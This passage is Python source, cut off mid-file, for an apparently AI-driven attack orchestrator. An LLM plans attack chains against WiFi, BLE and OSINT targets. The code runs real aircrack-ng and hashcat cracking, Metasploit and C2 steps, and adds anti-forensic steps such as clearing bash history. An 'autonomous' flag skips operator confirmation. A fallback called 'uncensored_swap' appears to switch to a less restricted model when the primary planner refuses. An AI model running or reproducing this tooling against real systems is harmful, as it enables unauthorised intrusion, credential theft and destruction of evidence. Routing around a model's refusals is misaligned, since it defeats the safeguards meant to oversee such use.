#!/usr/bin/env python3
"""
Autonomous Orchestrator
========================
Given a discovered target (WiFi AP, BLE device, OSINT host), the AI
(Ollama) generates a concrete, ordered attack chain. The orchestrator walks
the chain step-by-step, prompting the operator ACCEPT/CANCEL before each
real action. ``real`` steps execute real tools (airodump/aireplay/hashcat,
gatttool, Metasploit, lab C2 beacon); ``info`` steps (steganographic exfil
in third-party traffic, domain fronting vs real CDNs, anti-forensics) are
logged as text only — never executed, never simulated.

Thread-safe ACCEPT/CANCEL is provided by ``TuiConfirmFn``: the worker
thread enqueues a prompt and blocks; the curses main loop drains the queue,
renders the prompt, and returns the operator's answer.
"""

import glob
import json
import logging
import os
import queue
import re
import threading
import time
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional

logger = logging.getLogger(__name__)


class TuiConfirmFn:
    """Thread-safe confirm callback for the curses main loop.

    The orchestrator worker thread calls ``confirm(prompt)`` which enqueues
    the prompt and blocks on a result queue. The curses main loop must call
    ``poll(stdscr)`` each frame: it renders the pending prompt (if any) and,
    on ENTER/CANCEL, puts the answer back so the worker unblocks.
    """

    def __init__(self):
        self.pending = queue.Queue()  # items: {"prompt","answer","id"}
        self._current: Optional[Dict[str, Any]] = None
        self._lock = threading.Lock()  # guards _current + pending drain/requeue

    def confirm(self, prompt: str, timeout: float = 300.0) -> bool:
        """Called from a worker thread. Blocks until the TUI answers.

        Bounded poll + default-deny on timeout: if no answer arrives within
        ``timeout`` seconds (e.g. the curses drain loop is not running — tests,
        non-TUI callers, a sub-screen blocking getch), the step is denied
        instead of deadlocking the worker forever.

        On timeout the prompt is removed from the queue / cleared from
        ``_current`` so it cannot later steal an operator's keystroke meant
        for a *different* prompt (the stale-prompt-poisoning bug).
        """
        ans_q: queue.Queue = queue.Queue()
        entry = {"prompt": prompt, "answer": ans_q, "id": id(ans_q)}
        self.pending.put(entry)
        deadline = time.monotonic() + timeout
        try:
            while True:
                try:
                    return bool(ans_q.get(timeout=0.5))
                except queue.Empty:
                    if time.monotonic() >= deadline:
                        logger.warning(
                            "confirm() timed out after %.0fs (default-deny): %s",
                            timeout, prompt,
                        )
                        return False
        finally:
            # Best-effort cleanup so a timed-out prompt never poisons the
            # queue or steals a later operator response.
            self._drop_entry(entry)

    def _drop_entry(self, entry: Dict[str, Any]) -> None:
        """Remove ``entry`` from pending and clear _current if it is active."""
        with self._lock:
            if self._current is entry:
                self._current = None
            # Drain pending, drop our entry, requeue the rest in order.
            keep = []
            while True:
                try:
                    item = self.pending.get_nowait()
                except queue.Empty:
                    break
                if item is not entry:
                    keep.append(item)
            for item in keep:
                self.pending.put(item)

    def poll(self, stdscr, activity_log: Optional[List[str]] = None) -> Optional[str]:
        """Called from the curses main loop each frame.

        Renders any pending prompt. Returns one of:
          - None (no prompt pending, or prompt just shown — keep showing)
          - "prompt:<text>" (a prompt is active; caller should render it)
        The caller handles key input (ENTER=yes, 'n'/CANCEL=no) and calls
        ``respond(True/False)``.
        """
        with self._lock:
            if self._current is None and not self.pending.empty():
                self._current = self.pending.get()
            current = self._current
        if current is not None:
            return f"prompt:{current['prompt']}"
        return None

    @property
    def current_prompt(self) -> Optional[str]:
        with self._lock:
            if self._current is None:
                return None
            return self._current["prompt"]

    def respond(self, answer: bool):
        """Answer the active prompt and clear it.

        If ``_current`` is already None the keystroke is stale (the prompt was
        already answered, or no prompt was ever rendered). We drop it loudly
        rather than re-delivering it to the next queued prompt — re-delivery
        would auto-ACCEPT/CANCEL an offensive step the operator never saw,
        which is unsafe for a tool that runs real attacks on ACCEPT.
        """
        with self._lock:
            if self._current is not None:
                self._current["answer"].put(bool(answer))
                self._current = None
                return
        logger.warning(
            "respond(%r) with no active prompt — dropped (stale keystroke).",
            answer,
        )

    def has_pending(self) -> bool:
        with self._lock:
            return self._current is not None or not self.pending.empty()


def _default_deny(prompt: str) -> bool:
    logger.warning("orchestrator step blocked (default-deny): %s", prompt)
    return False


# Cache the set of zero-day-algorithm action names so _walk_ai_step can
# dispatch to the generic algorithm dispatcher in O(1). Built lazily.
_ZERO_DAY_ACTION_NAMES: Optional[frozenset] = None


def zero_day_algorithms_action_names() -> frozenset:
    """Return the frozenset of all zero-day-algorithm action names that
    :func:`_dispatch_zero_day_algorithm` knows how to dispatch. The
    underlying set is the :data:`ZERO_DAY_ALGORITHMS` registry in
    :mod:`core.ai_backend.zero_day_algorithms`."""
    global _ZERO_DAY_ACTION_NAMES
    if _ZERO_DAY_ACTION_NAMES is None:
        try:
            from core.ai_backend import zero_day_algorithms
            zero_day_algorithms._build_registry()
            _ZERO_DAY_ACTION_NAMES = frozenset(
                zero_day_algorithms.ZERO_DAY_ALGORITHMS.keys()
            )
        except Exception:  # noqa: BLE001
            _ZERO_DAY_ACTION_NAMES = frozenset()
    return _ZERO_DAY_ACTION_NAMES


class AutonomousOrchestrator:
    def __init__(self, ai_backend=None, kb=None, msf_runner=None,
                 osint_runner=None, on_event: Optional[Callable[[str], None]] = None,
                 confirm_fn: Optional[Callable[[str], bool]] = None,
                 interface: Optional[str] = None, settings=None,
                 external_terminal=None,
                 # --- new DI: AI-driven chain path (all optional for
                 # back-compat; defaults reproduce the legacy hardcoded
                 # ladder) ---
                 chain_planner=None, mcp_client=None,
                 exploit_gen_manager=None, zero_day_proposer=None,
                 zero_day_exploit_builder=None,
                 zero_day_exploit_runner=None,
                 zero_day_classifier=None,
                 post_exploit_runner=None, dashboard=None):
        self.ai_backend = ai_backend
        self.kb = kb
        self.msf_runner = msf_runner
        self.osint_runner = osint_runner
        self.on_event = on_event or (lambda msg: None)
        self.confirm_fn = confirm_fn or _default_deny
        self.interface = interface
        self.settings = settings
        # Optional external-terminal launcher for long-running steps
        # (airodump, deauth, hashcat, hostapd, msfconsole). When set, the
        # step will spawn the tool in the operator's terminal of choice
        # (xterm/gnome-terminal/tmux/tail — see core.utils.external_terminal)
        # instead of blocking the worker thread on subprocess.run. The
        # worker still waits on the Popen returncode.
        self.external_terminal = external_terminal
        # Dashboard reference (optional) — used by the post-access TUI
        # hook to push session/transport status onto the dashboard pill.
        # Best-effort; not wired in hermetic tests.
        self.dashboard = dashboard
        # New AI chain DI (see plan: splendid-launching-eagle.md).
        self.chain_planner = chain_planner
        self.mcp_client = mcp_client
        self.exploit_gen_manager = exploit_gen_manager
        self.zero_day_proposer = zero_day_proposer
        self.zero_day_exploit_builder = zero_day_exploit_builder
        self.zero_day_exploit_runner = zero_day_exploit_runner
        self.zero_day_classifier = zero_day_classifier
        # Post-exploit runner (defaults to building one lazily if we
        # have an AI backend; tests can pass a Fake).
        self.post_exploit_runner = post_exploit_runner

    # ------------------------------------------------------------------
    def _emit(self, msg: str):
        self.on_event(msg)
        logger.info(msg)

    def run(self, domain: str, seed: Dict[str, Any],
            *, autonomous: bool = False,
            use_ai_chain: bool = False,
            attach_zero_day: Optional[bool] = None) -> Dict[str, Any]:
        """Build and walk an AI-ordered attack chain step-by-step.

        Args:
            domain: wifi | ble | osint
            seed: the discovered target (AP / device / host dict)
            autonomous: if True, do not prompt — run real steps without
                confirm (still gated by confirm_fn if provided). Default
                False: prompt ACCEPT/CANCEL per step.
            use_ai_chain: when True and ``chain_planner`` is wired in,
                replace the hardcoded step ladder with an AI-generated
                chain (``AIChainPlanner.plan``). The plan's steps are
                dispatched on ``step["action"]``: ``mcp_call`` routes
                through ``mcp_client`` (or the legacy subprocess path);
                ``zero_day_propose`` drafts a 0-day concept (operator
                ACK required before persistence); ``post_exploit`` /
                ``external_terminal`` / ``run_tool`` go to the existing
                dispatchers. Backward-compat: defaults to False, which
                preserves the legacy hardcoded ladder.
            attach_zero_day: per-engagement override for the 0-day
                generator tail. When non-None, overrides the
                ``zero_day.attach_to_chain`` settings flag for this
                run; ``None`` (default) keeps the settings-based
                behavior so existing call sites are unchanged.
        """
        self._emit(f"[*] Orchestrator: {domain} engagement on {seed.get('ssid') or seed.get('name') or seed.get('target') or seed}")
        report: Dict[str, Any] = {
            "domain": domain, "seed": seed,
            "ai_plan": None, "kb_tools": [],
            "osint_findings": None, "msf_plan": None,
            "post_plan": None, "c2_plan": None,
            "executed": [], "skipped": [],
            "optional_declined": [],  # new: optional steps the operator declined
            "ai_chain": None,  # new: the planner's chain (when used)
            "ai_chain_source": None,  # new: "llm" | "uncensored_swap" | "heuristic"
            "zero_day_drafts": [],  # new: pending/acked concept drafts
            # Polymorphic re-plan / gain-access tracking (Part B/C).
            # ``access`` flips to achieved=True when a step's result data
            # carries creds or a session_id; the end-of-chain hooks use it
            # to trigger auto post-exploit + an interactive target shell.
            "access": {"achieved": False, "creds": None, "session_id": None},
            "replans": 0,  # number of live re-plans performed this run
        }

        # 1) AI plan via the shared backend (real Ollama/Groq/heuristic)
        if self.ai_backend is not None:
            try:
                report["ai_plan"] = self.ai_backend.query(
                    domain,
                    "Produce an ordered, concrete attack chain for this target. "
                    "Number each step and name the real tool/command. Mark any "
                    "step that is informational-only (steganography in third-party "
                    "traffic, domain fronting vs real CDNs, anti-forensics) with "
                    "'[INFO]' — those will NOT be executed.",
                    context=seed,
                )
            except Exception as e:
                report["ai_plan"] = f"[!] AI plan failed: {e}"
            if report["ai_plan"]:
                self._emit("=== AI Attack Chain ===")
                for line in report["ai_plan"].splitlines():
                    if line.strip():
                        self._emit(line)

        # 2) KB tools
        if self.kb is not None:
            try:
                report["kb_tools"] = self.kb.get_tools_for_domain(domain)[:20]
                self._emit(f"[i] KB {domain} tools: {len(report['kb_tools'])} repos")
            except Exception as e:
                logger.debug(f"KB tools: {e}")

        # 3) Step list: AI-driven chain (new path) or legacy hardcoded ladder.
        if use_ai_chain and self.chain_planner is not None:
            steps, source = self._build_ai_chain(
                domain, seed, report, attach_zero_day=attach_zero_day,
            )
            report["ai_chain"] = steps
            report["ai_chain_source"] = source
            # If the planner produced an empty/failed chain, fall back
            # to the legacy ladder so the operator still has *some*
            # steps to walk through (better than a silent no-op).
            if not steps and source in ("failed", "empty"):
                self._emit(
                    f"[!] AI chain {source}; falling back to legacy hardcoded ladder"
                )
                steps = self._build_steps(domain, seed, report)
        else:
            steps = self._build_steps(domain, seed, report)
            source = "legacy"
        # Walk the chain. The AI-chain path uses a polymorphic re-plan
        # loop: after each ACCEPTed+executed step, the planner is
        # re-queried with the live ``report["executed"]`` as
        # ``prior_results`` so it can propose the NEXT 1-3 steps adjusted
        # to the real outcome (failed crack → alternate path; access
        # achieved → post_exploit/open_shell). The legacy ladder path
        # keeps the original static walk (no planner wired).
        if use_ai_chain and self.chain_planner is not None and source != "legacy":
            self._walk_chain_with_replan(
                steps, seed, report, domain=domain,
                autonomous=autonomous, attach_zero_day=attach_zero_day,
            )
        else:
            for step in steps:
                self._walk_static_step(step, seed, report,
                                       autonomous=autonomous)

        # 3b) End-of-chain gain-access hooks (Part C). Both are
        # operator-gated (ACCEPT/CANCEL inside). They fire only when a
        # real access signal surfaced in some step's result data.
        self._maybe_run_gain_access_hooks(domain, seed, report,
                                          autonomous=autonomous)

        # 4) Post-exploit plan + C2 plan (AI text only; execution gated later)
        if self.ai_backend is not None:
            try:
                report["post_plan"] = self.ai_backend.query(
                    "post_exploitation",
                    "Given a foothold from this engagement, produce an ordered "
                    "post-exploitation plan.",
                    context=seed,
                )
                self._emit("=== AI Post-Exploitation Plan ===")
                for line in report["post_plan"].splitlines():
                    if line.strip():
                        self._emit(line)
            except Exception as e:
                report["post_plan"] = f"[!] post plan: {e}"
            try:
                report["c2_plan"] = self.ai_backend.query(
                    "c2",
                    "Produce a concrete C2 channel plan for this engagement. "
                    "Steganography/domain-fronting/anti-forensics are info-only.",
                    context=seed,
                )
                self._emit("=== AI C2 Plan ===")
                for line in report["c2_plan"].splitlines():
                    if line.strip():
                        self._emit(line)
            except Exception as e:
                report["c2_plan"] = f"[!] c2 plan: {e}"

        self._emit("[*] Engagement report complete.")
        return report

    # ------------------------------------------------------------------
    # AI-driven chain path (new)
    # ------------------------------------------------------------------
    def _resolve_attach_zd(self,
                           attach_zero_day: Optional[bool]) -> Optional[bool]:
        """Resolve the 0-day-tail attach flag for this engagement.

        Opt-in via settings (``zero_day.attach_to_chain``), defaults
        ``False`` so the default chain shape is unchanged. An explicit
        non-None ``attach_zero_day`` runtime arg overrides the settings
        flag (per-engagement toggle); ``None`` keeps settings. Extracted
        from :meth:`_build_ai_chain` so the polymorphic re-plan loop
        reuses the exact same resolution on every re-plan call.
        """
        try:
            if self.settings is not None and hasattr(self.settings, "get_setting"):
                zd = self.settings.get_setting("zero_day", {}) or {}
                attach_zd = bool(zd.get("attach_to_chain", False))
            else:
                attach_zd = False
        except Exception:
            attach_zd = False
        # An explicit non-None runtime arg overrides the settings flag.
        if attach_zero_day is not None:
            return bool(attach_zero_day)
        return attach_zd

    def _resolve_attach_post_exploit(
        self,
        attach_post_exploit: Optional[bool],
    ) -> bool:
        """Resolve the PostExploitSelector attach flag for this
        engagement.

        Defaults to ``True`` so the post-exploitation phase always
        includes the deterministic anti-forensic selector tail. Each
        injected step is operator-gated by the per-step ACCEPT/CANCEL
        prompt; the destructive subset only injects when the
        engagement is closing out (operator has flagged
        ``detaching: True``). An explicit runtime arg overrides the
        settings flag.
        """
        try:
            if self.settings is not None and hasattr(self.settings, "get_setting"):
                pe = self.settings.get_setting("post_exploit", {}) or {}
                attach_pe = bool(pe.get("attach_to_chain", True))
            else:
                attach_pe = True
        except Exception:
            attach_pe = True
        if attach_post_exploit is not None:
            return bool(attach_post_exploit)
        return attach_pe

    def _record_access(self, report: Dict[str, Any],
                       entry: Dict[str, Any]) -> None:
        """Inspect a freshly-appended ``executed`` entry's result/data
        for access signals (creds / session_id) and flip
        ``report["access"]`` accordingly. Never raises.

        Signals recognized:
          - ``session_id`` (str/int) at entry root, in ``result``, or
            in ``result["data"]`` → access achieved + session recorded.
          - ``creds`` / ``password`` / ``psk`` / ``pin`` (non-empty) in
            the same locations → access achieved + creds recorded.

        Both may be set independently (a captured PSK achieves WiFi
        access even without a meterpreter session; a session_id achieves
        host access even without a plaintext cred).
        """
        try:
            access = report.setdefault(
                "access",
                {"achieved": False, "creds": None, "session_id": None},
            )
            result = entry.get("result") if isinstance(entry, dict) else None
            data = None
            if isinstance(result, dict):
                data = result.get("data")
            # Collect candidate containers.
            containers = [entry, result, data]
            for c in containers:
                if not isinstance(c, dict):
                    continue
                sid = c.get("session_id")
                if sid and not access.get("session_id"):
                    access["achieved"] = True
                    access["session_id"] = sid
                for k in ("creds", "password", "psk", "pin", "key"):
                    v = c.get(k)
                    if v and not access.get("creds"):
                        access["achieved"] = True
                        access["creds"] = v
                        break
        except Exception:  # noqa: BLE001
            logger.debug("access record failed", exc_info=True)

    def _push_dashboard_post_access(self, access: Dict[str, Any]) -> None:
        """Push the current post-access TUI status to the dashboard.

        Best-effort: if no dashboard is wired (e.g. in hermetic tests,
        headless runs) or the dashboard lacks the ``post_access_status``
        attribute, this is a no-op. Never raises.
        """
        try:
            d = getattr(self, "dashboard", None)
            if d is None:
                return
            # The orchestrator can be initialized without a dashboard
            # reference; tolerate either AttributeError or a missing
            # post_access_status attribute.
            if hasattr(d, "post_access_status"):
                d.post_access_status = dict(access or {})
        except Exception:  # noqa: BLE001
            logger.debug("push dashboard post_access_status failed", exc_info=True)

    def _push_dashboard_cve_status(self, payload: Dict[str, Any]) -> None:
        """Push the latest CVE-lookup result to the dashboard pill.

        Same best-effort contract as ``_push_dashboard_post_access``:
        no-op when no dashboard is wired or the dashboard lacks the
        ``cve_lookup_status`` attribute. Never raises.
        """
        try:
            d = getattr(self, "dashboard", None)
            if d is None:
                return
            if hasattr(d, "cve_lookup_status"):
                d.cve_lookup_status = dict(payload or {})
        except Exception:  # noqa: BLE001
            logger.debug("push dashboard cve_lookup_status failed", exc_info=True)

    def _push_dashboard_exploit_status(self, payload: Dict[str, Any]) -> None:
        """Push the latest exploit-generation result to the dashboard pill.

        Best-effort; never raises. No-op when no dashboard is wired.
        """
        try:
            d = getattr(self, "dashboard", None)
            if d is None:
                return
            if hasattr(d, "exploit_gen_status"):
                d.exploit_gen_status = dict(payload or {})
        except Exception:  # noqa: BLE001
            logger.debug("push dashboard exploit_gen_status failed", exc_info=True)

    def _launch_real_step_window(self, step: Dict[str, Any],
                                 cmd: Any,
                                 log_path: Optional[str] = None) -> Dict[str, Any]:
        """Spawn ``cmd`` in an external terminal window for a real step.

        Wraps :func:`core.utils.external_terminal.launch_real_step`. Used
        by the gain-access dispatchers (:meth:`open_interactive_session`,
        :meth:`_dispatch_open_shell`) that build a clean argv. Returns
        ``{"ok": True, "pid": ...}`` / ``{"ok": False, "error": ...}``
        and never raises. When no real terminal backend is wired
        (``is_real_backend(self.external_terminal)`` is False) returns
        ``{"ok": False, "error": "no terminal backend"}`` so the caller
        can fall back to logging the manual command.
        """
        try:
            from core.utils.external_terminal import (
                is_real_backend, launch_real_step,
            )
            if not is_real_backend(self.external_terminal):
                return {"ok": False, "error": "no terminal backend"}
            return launch_real_step(step, cmd, log_path=log_path)
        except Exception as e:  # noqa: BLE001
            return {"ok": False, "error": str(e)}

    # ------------------------------------------------------------------
    # Gain-access helpers: wordlist resolution + real aircrack/hashcat.
    # Every helper returns a structured dict and never raises, so the
    # re-plan loop can inspect ``creds`` to detect "access achieved".
    # ------------------------------------------------------------------

    def _resolve_wordlist(self, seed: Dict[str, Any],
                          report: Optional[Dict[str, Any]] = None,
                          prefer: Optional[str] = None) -> str:
        """Pick a wordlist for dictionary cracking.

        Preference order: an operator-provided ``prefer``/``args.wordlist``,
        then the latest ``logs/recon/weakpass_*.txt`` produced by
        :func:`catalog_recon._weakpass_wordlist` (WPA/WPA2 only), then a
        bundled/system rockyou. If nothing exists we still return the
        best candidate so the cracker reports an honest "not found" rather
        than silently using a fake.
        """
        candidates: List[str] = []
        if prefer:
            candidates.append(prefer)
        if isinstance(seed, dict):
            wl = seed.get("wordlist")
            if wl:
                candidates.append(wl)
            # Recon may stash its produced weakpass path on the seed.
            for k in ("weakpass", "weakpass_wordlist"):
                v = seed.get(k)
                if v:
                    candidates.append(v)
        # Weakpass files generated per-target by catalog_recon.
        try:
            for pat in ("logs/recon/weakpass_*.txt", "logs/recon/weakpass_*"):
                files = sorted(glob.glob(pat))
                if files:
                    candidates.append(files[-1])
        except Exception:  # noqa: BLE001
            pass
        for d in ("wordlists/rockyou.txt",
                  "/usr/share/wordlists/rockyou.txt"):
            candidates.append(d)
        for c in candidates:
            if c and os.path.exists(c):
                return c
        return candidates[0] if candidates else "wordlists/rockyou.txt"

    def _crack_with_aircrack(self, pcap: Optional[str],
                             wordlist: str,
                             bssid: Optional[str] = None,
                             wep: bool = False) -> Dict[str, Any]:
        """Run aircrack-ng and parse a recovered key. Never raises."""
        import subprocess
        if not pcap or not os.path.exists(pcap):
            return {"ok": False, "method": "aircrack-ng",
                    "error": f"cap file not found: {pcap}"}
        if not os.path.exists(wordlist):
            return {"ok": False, "method": "aircrack-ng",
                    "error": f"wordlist not found: {wordlist}"}
        cmd = ["aircrack-ng", "-w", wordlist, "-a", "1" if wep else "2"]
        if bssid:
            cmd += ["-b", bssid]
        cmd.append(pcap)
        try:
            r = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=900)
        except FileNotFoundError:
            return {"ok": False, "method": "aircrack-ng",
                    "error": "aircrack-ng not installed"}
        except Exception as e:  # noqa: BLE001
            return {"ok": False, "method": "aircrack-ng", "error": str(e)}
        out = f"{r.stdout or ''}\n{r.stderr or ''}"
        psk = None
        m = re.search(r"KEY FOUND!?\s*\[\s*(.+?)\s*\]", out)
        if m:
            psk = m.group(1).strip()
        return {"ok": bool(psk), "method": "aircrack-ng",
                "return_code": r.returncode, "creds": psk,
                "stdout_tail": out[-200:]}

    def _pcap_to_hc22000(self, pcap: str) -> Optional[str]:
        """Convert a pcap/cap to hashcat hc22000 via hcxpcapngtool."""
        import subprocess
        base = str(pcap)
        for ext in (".pcap", ".cap"):
            if base.endswith(ext):
                base = base[: -len(ext)]
                break
        out = base + ".hc22000"
        try:
            subprocess.run(["hcxpcapngtool", "-o", out, str(pcap)],
                           capture_output=True, text=True, timeout=30)
        except FileNotFoundError:
            self._emit("[!] hcxpcapngtool not installed; cannot convert pcap")
            return None
        except Exception:  # noqa: BLE001
            return None
        return out if os.path.exists(out) else None

    def _crack_with_hashcat(self, hash_file: Optional[str],
                            wordlist: Optional[str] = None,
                            mask: Optional[str] = None,
                            mode: str = "22000",
                            attack_mode: int = 0,
                            gpu: bool = True,
                            timeout: int = 1800) -> Dict[str, Any]:
        """Run hashcat and recover the plaintext via ``--show``.

        Uses a per-run potfile so ``--show`` reliably reflects this run's
        recovery. For hc22000 (``-m 22000``) a cracked ``--show`` line is
        ``WPA*...:password`` (password after the last ``:``); uncracked
        lines have no trailing ``:password`` and are skipped. Never raises.
        """
        import subprocess
        import tempfile
        if not hash_file or not os.path.exists(hash_file):
            return {"ok": False, "method": "hashcat",
                    "error": f"hash file not found: {hash_file}"}
        pot = tempfile.NamedTemporaryFile(prefix="kfiosa_pot_",
                                          suffix=".pot", delete=False)
        pot.close()
        try:
            cmd = ["hashcat", "-m", str(mode), "-a", str(attack_mode),
                   f"--potfile-path={pot.name}", "--quiet"]
            if gpu:
                cmd += ["-D", "2", "-O"]
            if attack_mode == 3:
                cmd += [hash_file, mask or "?d?d?d?d?d?d?d?d"]
            else:
                if not wordlist or not os.path.exists(wordlist):
                    return {"ok": False, "method": "hashcat",
                            "error": f"wordlist not found: {wordlist}"}
                cmd += [hash_file, wordlist]
            try:
                r = subprocess.run(cmd, capture_output=True, text=True,
                                   timeout=timeout)
            except FileNotFoundError:
                return {"ok": False, "method": "hashcat",
                        "error": "hashcat not installed"}
            except Exception as e:  # noqa: BLE001
                return {"ok": False, "method": "hashcat", "error": str(e)}
            psk = None
            try:
                show = subprocess.run(
                    ["hashcat", "-m", str(mode), hash_file, "--show",
                     f"--potfile-path={pot.name}"],
                    capture_output=True, text=True, timeout=60)
                for line in (show.stdout or "").splitlines():
                    if ":" in line:
                        cand = line.rsplit(":", 1)[-1].strip()
                        if cand:
                            psk = cand
                            break
            except Exception:  # noqa: BLE001
                pass
            return {"ok": bool(psk), "method": "hashcat",
                    "return_code": r.returncode, "attack_mode": attack_mode,
                    "creds": psk, "stdout_tail": (r.stdout or "")[-200:]}
        finally:
            try:
                os.unlink(pot.name)
            except Exception:  # noqa: BLE001
                pass

    def _build_ai_chain(self, domain: str, seed: Dict[str, Any],
                        report: Dict[str, Any],
                        attach_zero_day: Optional[bool] = None) -> tuple:
        """Use ``chain_planner.plan`` to synthesize the step list.

        Returns (steps, source) where source is "llm" (primary call
        worked), "uncensored_swap" (had to fall back to the
        exploit-gen model), or "heuristic" (no LLM reachable).

        The planner handles all fallback logic; we just translate the
        result into the legacy step shape. The output of
        ``plan()`` is a list of dicts with the new shape ({action,
        tool, args, risk_level, ...}) — we pass them through
        unchanged so :meth:`_walk_ai_step` can dispatch on
        ``step["action"]``.
        """
        # Build CVE + KB inputs from the seed (vuln-driven: the selected
        # target's discovered CVEs / KB hits reach the planner) and the
        # report (domain-level KB tools as a fallback). Seeds without
        # these keys fall through to [] / domain-level tools — unchanged
        # behavior for the BLE/OSINT/legacy paths.
        cves = list(seed.get("cves") or [])
        kb_tools = (seed.get("kb_hits") or report.get("kb_tools") or [])
        # Optional: attach the 0-day exploit-generator tail to the chain.
        # Opt-in via settings (zero_day.attach_to_chain); defaults off so
        # the default chain shape is unchanged. Each tail step is
        # operator-gated (ACCEPT/CANCEL), so this only *offers* the path.
        # An explicit non-None ``attach_zero_day`` runtime arg overrides
        # the settings flag (per-engagement toggle); None keeps settings.
        attach_zd = self._resolve_attach_zd(attach_zero_day)
        # Phase 2.1.F: PostExploitSelector tail. The deterministic
        # selector reads the engagement context (target_class, used
        # actions, anonymity_required, detaching) and emits 1-3
        # anti-forensic/OPSEC steps. Each is per-step ACCEPT-gated;
        # destructive subset is gated on ``detaching=True`` in the
        # engagement context. Defaults to ON (catch-all
        # post_clear_bash_history always fires; the operator can
        # CANCEL the rest).
        attach_pe = self._resolve_attach_post_exploit(None)
        try:
            steps = self.chain_planner.plan(
                domain=domain, target=seed,
                cves=cves, kb_tools=kb_tools,
                attach_zero_day=attach_zd,
                attach_post_exploit=attach_pe,
            )
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] chain_planner.plan failed: {e}; using empty chain")
            return ([], "failed")
        if not steps:
            return ([], "empty")
        # Try to detect the source by looking at the planner's
        # internal flag (set during uncensored-swap); default to "llm"
        # since heuristic is the planner's last resort and emits
        # parseable steps too.
        source = "llm"
        try:
            ctx = getattr(self.chain_planner, "_last_context", None) or {}
            if ctx.get("uncensored_swap"):
                source = "uncensored_swap"
        except Exception:
            pass
        self._emit(
            f"[i] AI chain: {len(steps)} steps from source={source}"
        )
        return (steps, source)

    def _walk_static_step(self, step: Dict[str, Any], seed: Dict[str, Any],
                          report: Dict[str, Any], *,
                          autonomous: bool) -> None:
        """Walk one legacy-ladder step ({desc, kind} shape) — the original
        static walk, used when no AI chain planner is wired. Also used to
        dispatch a single AI-shaped step inside the re-plan loop when the
        step carries the ``{action, ...}`` schema. Access signals from the
        step's result are recorded via :meth:`_record_access`."""
        # AI-generated steps use a different schema ({action, tool, args,
        # rationale, risk_level, ...}) than the legacy ladder ({desc,
        # kind}). Detect which one we got and dispatch accordingly.
        if "action" in step and "desc" not in step:
            self._walk_ai_step(step, seed, report, autonomous=autonomous)
            return
        kind = step.get("kind", "real")
        desc = step["desc"]
        self._emit(f"[*] STEP ({kind}): {desc}")
        if autonomous:
            accept = True
        else:
            accept = self.confirm_fn(f"ACCEPT step? {desc}")
        if not accept:
            self._emit(f"[-] CANCELLED: {desc}")
            report["skipped"].append(desc)
            return
        if kind == "info":
            # informational only — log, do not execute, do not simulate
            self._emit(f"[i] (info, not executed) {desc}")
            entry = {"desc": desc, "kind": "info", "result": "logged only"}
            report["executed"].append(entry)
            self._record_access(report, entry)
            return
        # real step — execute
        res = self._execute_step(step, seed)
        self._emit(f"[+] {desc}: {res}")
        entry = {"desc": desc, "kind": "real", "result": res}
        report["executed"].append(entry)
        self._record_access(report, entry)

    def _executed_sig(self, entry: Dict[str, Any]) -> tuple:
        """A dedup signature for an executed step: (action, tool). Used by
        the re-plan loop to drop newly-proposed steps whose action+tool
        already ran (so a failing step isn't proposed again)."""
        if not isinstance(entry, dict):
            return ()
        action = entry.get("action") or entry.get("desc") or ""
        tool = entry.get("tool") or ""
        return (action, tool)

    def _walk_chain_with_replan(self, steps: List[Dict[str, Any]],
                                seed: Dict[str, Any],
                                report: Dict[str, Any], *,
                                domain: str,
                                autonomous: bool,
                                attach_zero_day: Optional[bool]) -> None:
        """Polymorphic re-plan walk (Part B).

        Walk ``steps`` by index. After each step that actually executed
        (``report["executed"]`` grew AND the step wasn't cancelled), call
        ``chain_planner.plan(..., prior_results=report["executed"], ...)``
        to get the NEXT 1-3 steps adjusted to the live outcome, and
        splice them in for ``steps[i+1:]`` (dropping leading duplicates
        whose (action, tool) already executed). Bounded by
        ``MAX_REPLANS`` (50 — raised from 25 to give target-adaptive
        real-world tuning enough room; see core.replan.max_replans) and
        a no-change guard (2 consecutive re-plans that propose nothing
        new → stop re-planning and just finish the remaining list).
        Each new step still passes through the per-step ACCEPT inside
        :meth:`_walk_ai_step`; cancelled steps are not re-planned.
        """
        # Kismet prechain: best-effort, gated only on the tool being
        # installed. The prechain runs UNGATED (it never contacts the
        # target — it only reads operator's own .kismet capture files
        # under workspace/captures/). On missing tool, missing dir,
        # or no match, we honest-degrade and continue.
        self._maybe_kismet_prechain(seed, report)
        from core.replan import MAX_REPLANS
        NO_CHANGE_LIMIT = 2
        i = 0
        replans = 0
        no_change = 0
        cves = list(seed.get("cves") or [])
        kb_tools = (seed.get("kb_hits") or report.get("kb_tools") or [])
        attach_zd = self._resolve_attach_zd(attach_zero_day)
        # Signatures of steps we have already dispatched (from the STEP
        # dict, not the executed entry — dispatchers rewrite ``tool`` to
        # the underlying runner name, which would break dedup). Used to
        # drop newly-proposed steps that repeat an already-walked action.
        done_sigs: set = set()
        while i < len(steps):
            step = steps[i]
            done_sigs.add(self._executed_sig(step))
            executed_before = len(report["executed"])
            # Dispatch this step (handles ACCEPT + execution).
            self._walk_static_step(step, seed, report, autonomous=autonomous)
            executed_now = len(report["executed"]) > executed_before
            # Stop re-planning once access is achieved — the end-of-chain
            # hooks (post-exploit + interactive shell) take over, and the
            # planner's directive already tells it to emit post_exploit /
            # open_shell, which we don't need to re-plan further.
            if report.get("access", {}).get("achieved"):
                # Still walk any remaining explicitly-planned steps (e.g.
                # an open_shell the planner already emitted), but don't
                # ask it to re-plan past access.
                i += 1
                continue
            # Only re-plan when the step actually executed (not cancelled),
            # a real planner is wired, and we haven't hit the bound.
            if (not executed_now or self.chain_planner is None
                    or replans >= MAX_REPLANS):
                i += 1
                continue
            new_steps = self._replan(domain, seed, report, cves=cves,
                                     kb_tools=kb_tools, attach_zd=attach_zd)
            if new_steps is None:
                i += 1
                continue
            # Dedup: drop leading new steps whose (action, tool) we have
            # already walked, so we don't repeat a just-failed step.
            while new_steps and self._executed_sig(new_steps[0]) in done_sigs:
                new_steps.pop(0)
            if not new_steps:
                no_change += 1
                if no_change >= NO_CHANGE_LIMIT:
                    self._emit(
                        "[i] re-plan: planner proposed nothing new twice; "
                        "finishing the remaining chain as-is"
                    )
                    i += 1
                    continue
                i += 1
                continue
            no_change = 0
            replans += 1
            report["replans"] = replans
            self._emit(
                f"[i] polymorphic re-plan #{replans}: splicing "
                f"{len(new_steps)} new step(s) into the chain"
            )
            # Replace the remaining tail with the live proposal.
            steps = steps[:i + 1] + new_steps
            i += 1

    def _replan(self, domain: str, seed: Dict[str, Any],
